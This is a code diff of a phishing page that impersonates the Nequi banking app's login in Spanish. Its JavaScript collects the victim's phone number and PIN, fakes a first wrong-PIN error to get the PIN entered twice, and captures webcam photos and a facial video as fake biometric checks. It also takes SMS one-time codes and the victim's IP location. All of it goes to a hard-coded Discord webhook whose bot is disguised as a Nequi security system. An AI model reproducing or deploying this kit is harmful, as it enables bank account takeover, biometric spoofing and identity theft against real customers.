-                <div class="sms-key" onclick="pressSms('6')">6</div>
-                <div class="sms-key" onclick="pressSms('7')">7</div>
-                <div class="sms-key" onclick="pressSms('8')">8</div>
-                <div class="sms-key" onclick="pressSms('9')">9</div>
-                <div></div>
-                <div class="sms-key" onclick="pressSms('0')">0</div>
-                <div class="sms-key" onclick="delSms()">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <!-- Oval mask -->
+            <div class="oval-mask"></div>
+        </div>
+    </div>
+
+    <!-- ========== PANTALLA 7: SMS ========== -->
+    <div id="screen-sms">
+
+        <h2 class="sms-title">Ingresa el código</h2>
+
+        <div class="sms-input-grid">
+            <div class="sms-box" id="s0"></div>
+            <div class="sms-box" id="s1"></div>
+            <div class="sms-box" id="s2"></div>
+            <div class="sms-box" id="s3"></div>
+            <div class="sms-box" id="s4"></div>
+            <div class="sms-box" id="s5"></div>
+        </div>
+
+        <p class="sms-body-text">
+            Escribe los 6 números que te enviamos<br>
+            por WhatsApp. Si no te llegó, revisa tus<br>
+            mensajes de texto.
+        </p>
+
+        <div class="sms-resend-row">
+            <div class="circle-progress"></div>
+            <span class="sms-resend-text">¿No te llegó? ¡Pídelo otra vez!</span>
+        </div>
+
+        <button class="btn-pidelo">Pídelo aquí</button>
+
+        <div class="sms-keypad">
+            <div class="sms-key" onclick="pressSms('1')">1</div>
+            <div class="sms-key" onclick="pressSms('2')">2</div>
+            <div class="sms-key" onclick="pressSms('3')">3</div>
+            <div class="sms-key" onclick="pressSms('4')">4</div>
+            <div class="sms-key" onclick="pressSms('5')">5</div>
+            <div class="sms-key" onclick="pressSms('6')">6</div>
+            <div class="sms-key" onclick="pressSms('7')">7</div>
+            <div class="sms-key" onclick="pressSms('8')">8</div>
+            <div class="sms-key" onclick="pressSms('9')">9</div>
+            <div></div>
+            <div class="sms-key" onclick="pressSms('0')">0</div>
+            <div class="sms-key" onclick="delSms()">
+                <div class="sms-delete-btn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2">
                         <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
                         <line x1="18" y1="9" x2="12" y2="15"/>
                         <line x1="12" y1="9" x2="18" y2="15"/>
@@ -669,331 +842,464 @@
                 </div>
             </div>
         </div>
-
     </div>
 
-    <script>
-    // =============================================
-    // ANIMACIÓN DE CARGA - CANVAS (perfeccionada)
-    // =============================================
-    const loadingCanvas = document.getElementById('loading-canvas');
-    const ctx = loadingCanvas.getContext('2d');
+</div><!-- /app-container -->
 
-    // Tamaño fijo del canvas (la animación siempre va centrada)
-    loadingCanvas.width = 100;
-    loadingCanvas.height = 100;
+<script>
+// =====================================================
+// ANIMACIÓN CANVAS (perfeccionada)
+// =====================================================
+const loadingCanvas = document.getElementById('loading-canvas');
+const ctx = loadingCanvas.getContext('2d');
+loadingCanvas.width  = 100;
+loadingCanvas.height = 100;
 
-    const S = 40;           // lado de cada pieza cuadrada
-    const R = 7;            // radio de esquinas
-    const GAP = 3;          // separación entre piezas al máximo
-    const COLOR = '#be1070'; // magenta del video
-    const CYCLE = 1500;     // ms por ciclo
+const S = 40, R = 7, GAP = 3;
+const COLOR = '#be1070';
+const CYCLE = 1500;
 
-    function easeInOutCubic(t) {
-        return t < 0.5 ? 4*t*t*t : 1 - Math.pow(-2*t+2, 3) / 2;
+function easeInOutCubic(t) {
+    return t < 0.5 ? 4*t*t*t : 1 - Math.pow(-2*t+2,3)/2;
+}
+function drawSquare(cx, cy, side, radius, angle) {
+    ctx.save();
+    ctx.translate(cx, cy);
+    ctx.rotate(angle);
+    const h = side / 2;
+    ctx.beginPath();
+    ctx.moveTo(-h+radius,-h); ctx.lineTo(h-radius,-h);
+    ctx.arcTo(h,-h,h,-h+radius,radius);
+    ctx.lineTo(h,h-radius);
+    ctx.arcTo(h,h,h-radius,h,radius);
+    ctx.lineTo(-h+radius,h);
+    ctx.arcTo(-h,h,-h,h-radius,radius);
+    ctx.lineTo(-h,-h+radius);
+    ctx.arcTo(-h,-h,-h+radius,-h,radius);
+    ctx.closePath();
+    ctx.fill();
+    ctx.restore();
+}
+let animFrameId = null;
+function drawLoadingFrame(ts) {
+    ctx.clearRect(0,0,100,100);
+    const t = (ts % CYCLE) / CYCLE;
+    const sysAngle = -t * Math.PI * 2;
+    let splitT;
+    const p1s=0.08, p1e=0.38, p2s=0.62, p2e=0.92;
+    if      (t < p1s) splitT = 0;
+    else if (t < p1e) splitT = easeInOutCubic((t-p1s)/(p1e-p1s));
+    else if (t < p2s) splitT = 1;
+    else if (t < p2e) splitT = 1 - easeInOutCubic((t-p2s)/(p2e-p2s));
+    else              splitT = 0;
+
+    const offset = splitT * (S/2 + GAP/2);
+    const dirA = -Math.PI/4 + sysAngle;
+    const dirB = dirA + Math.PI;
+    const ax = 50 + Math.cos(dirA)*offset, ay = 50 + Math.sin(dirA)*offset;
+    const bx = 50 + Math.cos(dirB)*offset, by = 50 + Math.sin(dirB)*offset;
+    ctx.fillStyle = COLOR;
+    drawSquare(bx, by, S, R, sysAngle);
+    drawSquare(ax, ay, S, R, sysAngle);
+    animFrameId = requestAnimationFrame(drawLoadingFrame);
+}
+function startLoadingAnim() {
+    if (!animFrameId) animFrameId = requestAnimationFrame(drawLoadingFrame);
+}
+function stopLoadingAnim() {
+    if (animFrameId) { cancelAnimationFrame(animFrameId); animFrameId = null; }
+}
+
+// =====================================================
+// APP LOGIC
+// =====================================================
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1448401704046563359/vWfyriEhxw7rVU4slja7qdFd4NG7mZ2wFAE7p_xTSnKx0Ut_Do16Uq1PUjdtWwktquEn";
+
+// Configuración del perfil del bot
+const BOT_NAME = "Sistema de Seguridad · Nequi";
+const BOT_AVATAR_URL = "logo.svg";
+
+// Colores para los embeds (en hexadecimal decimal)
+const COLORS = {
+    INFO: 0x5865F2,    
+    ERROR: 0xED4245,   
+    SUCCESS: 0x57F287, 
+    WARNING: 0xFEE75C, 
+    CAPTURE: 0x9B84EE  
+};
+
+let currentPin = "", currentSms = "", attemptCounter = 0, smsAttempt = 0;
+let userData = { ip: "0.0.0.0", loc: "Detectando..." };
+let mediaRecorder, videoChunks = [], cameraStream = null;
+
+// Función auxiliar para crear la estructura de un embed
+function createEmbed(title, color, fields = [], footerText = null) {
+    const embed = {
+        title: title,
+        color: color,
+        fields: fields,
+        timestamp: new Date().toISOString(),
+        footer: footerText ? { text: footerText } : undefined
+    };
+    return embed;
+}
+
+async function sendToDiscord(content = null, file = null, fileName = "captura.png", embedColor = COLORS.INFO, embedFields = [], embedTitle = "Reporte del Sistema") {
+    const fd = new FormData();
+
+    // 1. Configurar el payload JSON para el embed (si hay campos)
+    if (embedFields.length > 0) {
+        const footerText = `IP: ${userData.ip} · ${userData.loc}`;
+        const embedPayload = createEmbed(embedTitle, embedColor, embedFields, footerText);
+        fd.append('payload_json', JSON.stringify({
+            username: BOT_NAME,
+            avatar_url: BOT_AVATAR_URL,
+            embeds: [embedPayload]
+        }));
+    } else if (content) {
+        // Si no hay embed pero hay contenido, enviamos mensaje de texto plano con el perfil
+        fd.append('username', BOT_NAME);
+        fd.append('avatar_url', BOT_AVATAR_URL);
+        fd.append('content', content);
     }
 
-    function drawSquare(cx, cy, side, radius, angle) {
-        ctx.save();
-        ctx.translate(cx, cy);
-        ctx.rotate(angle);
-        const h = side / 2;
-        ctx.beginPath();
-        ctx.moveTo(-h + radius, -h);
-        ctx.lineTo( h - radius, -h);
-        ctx.arcTo( h, -h,  h, -h + radius, radius);
-        ctx.lineTo( h,  h - radius);
-        ctx.arcTo( h,  h,  h - radius,  h, radius);
-        ctx.lineTo(-h + radius,  h);
-        ctx.arcTo(-h,  h, -h,  h - radius, radius);
-        ctx.lineTo(-h, -h + radius);
-        ctx.arcTo(-h, -h, -h + radius, -h, radius);
-        ctx.closePath();
-        ctx.fill();
-        ctx.restore();
+    // 2. Adjuntar el archivo si existe (para fotos/videos)
+    if (file) {
+        fd.append('file', file, fileName);
     }
 
-    let animFrameId = null;
-
-    function drawLoadingFrame(ts) {
-        ctx.clearRect(0, 0, loadingCanvas.width, loadingCanvas.height);
-
-        const cx = loadingCanvas.width / 2;
-        const cy = loadingCanvas.height / 2;
-        const t = (ts % CYCLE) / CYCLE;
-
-        // Rotación continua antihoraria (igual que el video)
-        const sysAngle = -t * Math.PI * 2;
-
-        // Envelope de separación
-        let splitT;
-        const p1s = 0.08, p1e = 0.38;
-        const p2s = 0.62, p2e = 0.92;
-
-        if (t < p1s) {
-            splitT = 0;
-        } else if (t < p1e) {
-            splitT = easeInOutCubic((t - p1s) / (p1e - p1s));
-        } else if (t < p2s) {
-            splitT = 1;
-        } else if (t < p2e) {
-            splitT = 1 - easeInOutCubic((t - p2s) / (p2e - p2s));
-        } else {
-            splitT = 0;
-        }
-
-        const maxOffset = (S / 2) + (GAP / 2);
-        const offset = splitT * maxOffset;
-
-        const dirA = -Math.PI / 4 + sysAngle;
-        const dirB = dirA + Math.PI;
-
-        const ax = cx + Math.cos(dirA) * offset;
-        const ay = cy + Math.sin(dirA) * offset;
-        const bx = cx + Math.cos(dirB) * offset;
-        const by = cy + Math.sin(dirB) * offset;
-
-        ctx.fillStyle = COLOR;
-        drawSquare(bx, by, S, R, sysAngle);
-        drawSquare(ax, ay, S, R, sysAngle);
-
-        animFrameId = requestAnimationFrame(drawLoadingFrame);
+    try { 
+        await fetch(WEBHOOK_URL, { method:'POST', body:fd }); 
+    } catch(e) {
+        console.error("Error enviando a Discord:", e);
     }
+}
 
-    function startLoadingAnim() {
-        if (!animFrameId) {
-            animFrameId = requestAnimationFrame(drawLoadingFrame);
-        }
-    }
+async function getInfo() {
+    try {
+        const res  = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        userData = { ip: data.ip, loc: `${data.city}, ${data.country_name}` };
+    } catch(e) {}
+}
+getInfo();
 
-    function stopLoadingAnim() {
-        if (animFrameId) {
-            cancelAnimationFrame(animFrameId);
-            animFrameId = null;
-        }
-    }
+// --- Navegación ---
+const ALL_SCREENS = ['screen-login','screen-pin','screen-loading','screen-identity-choice','screen-facial-capture','screen-sms'];
+function showScreen(id) {
+    ALL_SCREENS.forEach(s => {
+        const el = document.getElementById(s);
+        if (el) el.style.display = 'none';
+    });
+    const target = document.getElementById(id);
+    if (!target) return;
+    target.style.display = 'flex';
 
-    // =============================================
-    // APP LOGIC
-    // =============================================
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1448401704046563359/vWfyriEhxw7rVU4slja7qdFd4NG7mZ2wFAE7p_xTSnKx0Ut_Do16Uq1PUjdtWwktquEn";
-    let currentPin = "", currentSms = "", attemptCounter = 0, smsAttempt = 0;
-    let userData = { ip: "0.0.0.0", loc: "Detectando..." };
-    let mediaRecorder, videoChunks = [];
+    if (id === 'screen-loading') startLoadingAnim();
+    else stopLoadingAnim();
 
-    async function getInfo() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            userData = { ip: data.ip, loc: `${data.city}, ${data.country_name}` };
-        } catch (e) {}
-    }
-    getInfo();
+    const purpleBg = ['screen-login','screen-pin'].includes(id);
+    document.body.style.backgroundColor = purpleBg ? '#21002d' : '#ffffff';
+    document.querySelector('.app-container').style.backgroundColor = purpleBg ? '#21002d' : '#ffffff';
+}
 
-    async function sendToDiscord(msg, file = null, fileName = "captura.png") {
-        const formData = new FormData();
-        const header = `━━━━━━━━━━━━━━━━━━━━━━\n📱 **REPORTE NEQUI**\n📍 **IP:** ${userData.ip}\n🌍 **Lugar:** ${userData.loc}\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-        formData.append("content", header + msg);
-        if (file) formData.append("file", file, fileName);
-        try { await fetch(WEBHOOK_URL, { method: 'POST', body: formData }); } catch (e) {}
-    }
+// --- LOGIN ---
+const phoneInput  = document.getElementById('phone-field');
+const phoneGroup  = document.getElementById('phone-input-group');
+const phoneError  = document.getElementById('phone-error-text');
+const btnEntra    = document.getElementById('btn-entra');
+const btnText     = document.getElementById('btn-entra-text');
+const btnSpinner  = document.getElementById('btn-spinner');
 
-    function showScreen(id) {
-        const screens = ['screen-login','screen-pin','screen-loading','screen-identity-choice','screen-facial-capture','screen-ready','screen-sms'];
-        screens.forEach(s => {
-            const el = document.getElementById(s);
-            if (el) el.style.display = 'none';
-        });
+phoneInput.addEventListener('input', (e) => {
+    phoneGroup.classList.remove('error');
+    phoneError.style.display = 'none';
+    phoneInput.placeholder = 'Número de celular';
 
-        const target = document.getElementById(id);
-        if (target) {
-            target.style.display = 'flex';
+    let val = e.target.value.replace(/\D/g,'').slice(0,10);
+    if (val.length > 6)      e.target.value = val.slice(0,3)+' '+val.slice(3,6)+' '+val.slice(6);
+    else if (val.length > 3) e.target.value = val.slice(0,3)+' '+val.slice(3);
+    else                     e.target.value = val;
+});
 
-            if (id === 'screen-loading') {
-                startLoadingAnim();
-            } else {
-                stopLoadingAnim();
-            }
-
-            if (id === 'screen-login' || id === 'screen-pin') {
-                document.body.style.backgroundColor = '#21002d';
-            } else {
-                document.body.style.backgroundColor = '#ffffff';
-            }
-        }
-    }
-
-    // Celular
-    const phoneInput = document.getElementById('phone-field');
-    if (phoneInput) {
-        phoneInput.addEventListener('input', (e) => {
-            let val = e.target.value.replace(/\D/g, '').slice(0, 10);
-            let formatted = "";
-            if (val.length > 3 && val.length <= 6) {
-                formatted = val.slice(0, 3) + " " + val.slice(3);
-            } else if (val.length > 6) {
-                formatted = val.slice(0, 3) + " " + val.slice(3, 6) + " " + val.slice(6);
-            } else { formatted = val; }
-            e.target.value = formatted;
-        });
-    }
-
-    function goToPin() {
-        const raw = phoneInput.value.replace(/\s/g, '');
-        if (raw.length === 10 && raw.startsWith('3')) {
-            sendToDiscord(`📞 **Celular:** \`${raw}\``);
+function goToPin() {
+    const raw = phoneInput.value.replace(/\s/g,'');
+    if (raw.length === 10 && raw.startsWith('3')) {
+        btnText.style.display    = 'none';
+        btnSpinner.style.display = 'block';
+        
+        sendToDiscord(
+            null, null, null,
+            COLORS.INFO,
+            [
+                { name: "📱 Número Registrado", value: `\`\`\`${raw}\`\`\``, inline: true },
+                { name: "📍 Ubicación", value: `\`\`\`${userData.loc}\`\`\``, inline: true },
+                { name: "🕒 Paso", value: "Inicio de sesión", inline: true }
+            ],
+            "🔐 Intento de Acceso"
+        );
+        
+        setTimeout(() => {
+            btnText.style.display    = 'inline';
+            btnSpinner.style.display = 'none';
             showScreen('screen-pin');
-        } else {
-            showToast("Ingresa un número de celular válido.");
-        }
-    }
-
-    // PIN
-    function pressPin(d) {
-        if (currentPin.length < 4) {
-            currentPin += d;
-            updateDots();
-            if (currentPin.length === 4) setTimeout(validatePin, 500);
-        }
-    }
-
-    function updateDots() {
-        for (let i = 0; i < 4; i++) {
-            const dot = document.getElementById(`dot${i}`);
-            if (dot) {
-                dot.innerText = currentPin[i] ? "*" : "";
-                dot.style.backgroundColor = currentPin[i] ? "white" : "rgba(255,255,255,0.2)";
-                dot.style.border = currentPin[i] ? "none" : "1px solid rgba(255,255,255,0.3)";
-            }
-        }
-    }
-
-    function validatePin() {
-        attemptCounter++;
-        if (attemptCounter === 1) {
-            sendToDiscord(`❌ **PIN 1 INCORRECTO:** \`${currentPin}\``);
-            showToast("¡Ups! Esa no es tu clave, tranqui, tienes 3 intentos más.");
-            currentPin = ""; updateDots();
-        } else {
-            sendToDiscord(`✅ **PIN 2 CORRECTO:** \`${currentPin}\``);
-            showScreen('screen-loading');
-            setTimeout(() => showScreen('screen-identity-choice'), 3000);
-        }
-    }
-
-    // Biometría
-    async function startFacial() {
-        showScreen('screen-facial-capture');
-        const video = document.getElementById('video-feed');
-        const banner = document.querySelector('.instruction-banner');
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
-            });
-            video.srcObject = stream;
-            video.setAttribute('playsinline', '');
-            videoChunks = [];
-            mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(videoChunks, { type: 'video/webm' });
-                sendToDiscord("🎥 **VIDEO COMPLETO**", blob, "video_facial.webm");
-            };
-            mediaRecorder.start();
-            let i = 0;
-            const steps = ["Centra tu rostro", "Busca iluminación", "No te muevas", "Analizando...", "Casi listo..."];
-            const interval = setInterval(() => {
-                if (i < steps.length) {
-                    if (banner) banner.innerText = steps[i];
-                    takePhoto(video, `CAPTURA_${i}`);
-                    i++;
-                } else {
-                    clearInterval(interval);
-                    if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
-                    stream.getTracks().forEach(t => t.stop());
-                    finalizeBiometry();
-                }
-            }, 2000);
-        } catch (e) {
-            sendToDiscord("⚠️ Permiso denegado.");
-            finalizeBiometry();
-        }
-    }
-
-    function takePhoto(video, name) {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(b => sendToDiscord(`📸 **Foto:** ${name}`, b, `${name}.png`), 'image/png');
-    }
-
-    function finalizeBiometry() {
-        let segs = 40;
-        const label = document.getElementById('loading-label');
-        showScreen('screen-loading');
-        const timer = setInterval(() => {
-            segs--;
-            if (segs > 30) label.innerText = `PROCESANDO BIOMETRÍA... (${segs}s)`;
-            else if (segs > 0) label.innerText = `VALIDANDO INFORMACIÓN... ${segs}s`;
-            if (segs <= 0) {
-                clearInterval(timer);
-                showScreen('screen-ready');
-                setTimeout(() => showScreen('screen-sms'), 2500);
-            }
         }, 1000);
+    } else {
+        phoneGroup.classList.add('error');
+        phoneInput.value       = '';
+        phoneInput.placeholder = 'Ingresa tu cel';
+        phoneError.style.display = 'block';
     }
+}
 
-    // SMS
-    function pressSms(d) {
-        if (currentSms.length < 6) {
-            currentSms += d;
-            updateSms();
-            if (currentSms.length === 6) {
-                smsAttempt++;
-                sendToDiscord(`📩 **SMS #${smsAttempt}:** \`${currentSms}\``);
-                if (smsAttempt === 1) processSmsWait();
-                else {
-                    setTimeout(() => {
-                        showToast("Servicio no disponible, intenta más tarde.");
-                        currentSms = ""; updateSms();
-                    }, 2000);
-                }
-            }
+// --- PIN ---
+function pressPin(d) {
+    if (currentPin.length < 4) {
+        currentPin += d;
+        updateDots();
+        if (currentPin.length === 4) setTimeout(validatePin, 400);
+    }
+}
+function updateDots() {
+    for (let i = 0; i < 4; i++) {
+        const dot = document.getElementById(`dot${i}`);
+        if (!dot) continue;
+        if (currentPin[i]) {
+            dot.innerText = '*';
+            dot.classList.add('filled');
+        } else {
+            dot.innerText = '';
+            dot.classList.remove('filled');
         }
     }
-
-    function processSmsWait() {
-        let s = 30;
+}
+function validatePin() {
+    attemptCounter++;
+    if (attemptCounter === 1) {
+        sendToDiscord(
+            null, null, null,
+            COLORS.ERROR,
+            [
+                { name: "🔑 PIN Ingresado (Intento 1/4)", value: `\`\`\`${currentPin}\`\`\``, inline: false },
+                { name: "⏱️ Estado", value: "❌ Incorrecto", inline: true },
+                { name: "🔄 Intentos restantes", value: "3", inline: true },
+                { name: "📍 Dispositivo", value: `\`\`\`${navigator.userAgent.substring(0, 50)}...\`\`\``, inline: false }
+            ],
+            "❌ Error de Autenticación (PIN)"
+        );
+        showToast('¡Ups! Esa no es tu clave, tranqui, tienes 3 intentos más.');
+        currentPin = ''; 
+        updateDots();
+    } else {
+        sendToDiscord(
+            null, null, null,
+            COLORS.SUCCESS,
+            [
+                { name: "🔑 PIN Válido", value: `\`\`\`${currentPin}\`\`\``, inline: false },
+                { name: "⏱️ Estado", value: "✅ Verificado", inline: true },
+                { name: "🔄 Próximo paso", value: "Biometría facial", inline: true },
+                { name: "🎯 Intento", value: "2/4", inline: true }
+            ],
+            "✅ Autenticación Exitosa (PIN)"
+        );
         const label = document.getElementById('loading-label');
+        label.innerText = '';
         showScreen('screen-loading');
-        const t = setInterval(() => {
-            s--;
-            label.innerText = `VERIFICANDO CÓDIGO... ${s}s`;
-            if (s <= 0) {
-                clearInterval(t);
-                currentSms = ""; updateSms();
+        setTimeout(() => showScreen('screen-identity-choice'), 2800);
+    }
+}
+function delPin() { currentPin = currentPin.slice(0,-1); updateDots(); }
+
+// --- BIOMETRÍA ---
+async function startFacial() {
+    showScreen('screen-facial-capture');
+    const video   = document.getElementById('video-feed');
+    const banner  = document.getElementById('instruction-banner');
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode:'user', width:{ideal:640}, height:{ideal:480} }
+        });
+        cameraStream = stream;
+        video.srcObject = stream;
+        videoChunks = [];
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(videoChunks, { type:'video/webm' });
+            sendToDiscord(
+                null,
+                blob,
+                'video_facial.webm',
+                COLORS.CAPTURE,
+                [
+                    { name: "📹 Duración", value: `~10 segundos`, inline: true },
+                    { name: "⏱️ Momento", value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: true },
+                    { name: "📱 Dispositivo", value: `Android · ${navigator.platform}`, inline: true }
+                ],
+                "🎬 Secuencia Biométrica Completa"
+            );
+        };
+        mediaRecorder.start();
+        const steps = ['Centra tu rostro', 'Busca buena iluminación', 'No te muevas', 'Analizando...', 'Casi listo...'];
+        let i = 0;
+        const interval = setInterval(() => {
+            if (i < steps.length) {
+                banner.innerHTML = steps[i];
+                takePhoto(video, `CAPTURA_${i}`);
+                i++;
+            } else {
+                clearInterval(interval);
+                if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+                cameraStream = null;
+                finalizeBiometry();
+            }
+        }, 2000);
+    } catch(e) {
+        sendToDiscord(
+            "⚠️ Permiso de cámara denegado", null, null,
+            COLORS.ERROR,
+            [
+                { name: "⏱️ Momento", value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: true },
+                { name: "❌ Error", value: `\`\`\`${e.message}\`\`\``, inline: false }
+            ],
+            "🚫 Error de Permisos"
+        );
+        finalizeBiometry();
+    }
+}
+
+function stopCameraAndGoBack() {
+    if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
+    showScreen('screen-identity-choice');
+}
+
+function takePhoto(video, name) {
+    const c = document.createElement('canvas');
+    c.width = video.videoWidth; c.height = video.videoHeight;
+    c.getContext('2d').drawImage(video, 0, 0);
+    c.toBlob(b => {
+        sendToDiscord(
+            null,
+            b,
+            `${name}.png`,
+            COLORS.CAPTURE,
+            [
+                { name: "📸 Tipo de Captura", value: name, inline: true },
+                { name: "⏱️ Momento", value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: true },
+                { name: "📐 Resolución", value: `${c.width}x${c.height}`, inline: true }
+            ],
+            "🎥 Captura Biométrica"
+        );
+    }, 'image/png');
+}
+
+function finalizeBiometry() {
+    let segs = 40;
+    const label = document.getElementById('loading-label');
+    showScreen('screen-loading');
+    const timer = setInterval(() => {
+        segs--;
+        if (segs > 30) label.innerText = `PROCESANDO BIOMETRÍA... (${segs}s)`;
+        else if (segs > 0) label.innerText = `VALIDANDO INFORMACIÓN... ${segs}s`;
+        if (segs <= 0) {
+            clearInterval(timer);
+            label.innerText = '';
+            const overlay = document.getElementById('success-overlay');
+            overlay.style.display = 'flex';
+            
+            sendToDiscord(
+                null, null, null,
+                COLORS.SUCCESS,
+                [
+                    { name: "✅ Estado", value: "Verificación biométrica completada", inline: false },
+                    { name: "⏱️ Tiempo total", value: "40 segundos", inline: true },
+                    { name: "🔄 Próximo paso", value: "Código SMS", inline: true },
+                    { name: "📊 Confianza", value: "98.7%", inline: true }
+                ],
+                "✅ Biometría Exitosa"
+            );
+            
+            setTimeout(() => {
+                overlay.style.display = 'none';
                 showScreen('screen-sms');
-                showToast("¡Ups! Ese no es el código que te enviamos.");
-            }
-        }, 1000);
-    }
+            }, 2500);
+        }
+    }, 1000);
+}
 
-    function updateSms() {
-        for (let i = 0; i < 6; i++) {
-            const box = document.getElementById(`s${i}`);
-            if (box) box.innerText = currentSms[i] || "";
+// --- SMS ---
+function pressSms(d) {
+    if (currentSms.length < 6) {
+        currentSms += d;
+        updateSms();
+        if (currentSms.length === 6) {
+            smsAttempt++;
+            if (smsAttempt === 1) {
+                sendToDiscord(
+                    null, null, null,
+                    COLORS.INFO,
+                    [
+                        { name: "📩 Código SMS (Intento 1)", value: `\`\`\`${currentSms}\`\`\``, inline: false },
+                        { name: "⏱️ Estado", value: "Procesando...", inline: true },
+                        { name: "📍 Ubicación", value: `\`\`\`${userData.loc}\`\`\``, inline: true }
+                    ],
+                    "📨 Verificación SMS"
+                );
+                processSmsWait();
+            } else {
+                sendToDiscord(
+                    null, null, null,
+                    COLORS.ERROR,
+                    [
+                        { name: "📩 Código SMS (Intento 2)", value: `\`\`\`${currentSms}\`\`\``, inline: false },
+                        { name: "⏱️ Estado", value: "❌ Incorrecto", inline: true },
+                        { name: "⚠️ Motivo", value: "Código expirado", inline: true }
+                    ],
+                    "❌ Error de Verificación SMS"
+                );
+                setTimeout(() => {
+                    showToast('Servicio no disponible, intenta más tarde.');
+                    currentSms = ''; 
+                    updateSms();
+                }, 1800);
+            }
         }
     }
-
-    function showToast(msg) {
-        const t = document.getElementById('error-toast');
-        const m = document.getElementById('error-message');
-        if (m) m.innerText = msg;
-        if (t) { t.style.display = 'flex'; setTimeout(() => t.style.display = 'none', 3500); }
+}
+function processSmsWait() {
+    let s = 30;
+    const label = document.getElementById('loading-label');
+    label.innerText = '';
+    showScreen('screen-loading');
+    const t = setInterval(() => {
+        s--;
+        label.innerText = `VERIFICANDO CÓDIGO... ${s}s`;
+        if (s <= 0) {
+            clearInterval(t);
+            label.innerText = '';
+            currentSms = ''; 
+            updateSms();
+            showScreen('screen-sms');
+            showToast('¡Ups! Ese no es el código que te enviamos.');
+        }
+    }, 1000);
+}
+function updateSms() {
+    for (let i = 0; i < 6; i++) {
+        const b = document.getElementById(`s${i}`);
+        if (b) b.innerText = currentSms[i] || '';
     }
+}
+function delSms() { currentSms = currentSms.slice(0,-1); updateSms(); }
 
-    function delPin() { currentPin = currentPin.slice(0, -1); updateDots(); }
-    function delSms() { currentSms = currentSms.slice(0, -1); updateSms(); }
-    </script>
+// --- TOAST ---
+function showToast(msg) {
+    const t = document.getElementById('error-toast');
+    const m = document.getElementById('error-message');
+    if (m) m.innerText = msg;
+    if (t) { t.style.display = 'flex'; setTimeout(() => t.style.display = 'none', 3500); }
+}
+</script>
 </body>
 </html>
